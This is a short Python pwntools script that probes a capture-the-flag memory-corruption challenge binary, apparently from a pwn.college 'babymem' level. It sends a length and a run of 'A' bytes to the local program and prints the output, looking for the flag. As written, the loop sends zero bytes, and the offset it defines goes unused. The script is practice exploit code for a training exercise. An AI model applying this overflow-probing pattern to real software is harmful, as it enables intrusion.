from pwn import *

file = "/challenge/babymem_level11.1"
offset = 61
for i in range(1):
    p = process(file)

    length = bytes(str(i*16), 'ascii')
    p.sendline(length)
    
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    p.send(b'A'*(i*16))
    flag = p.recvall()
    print(len(flag))
    print(flag)
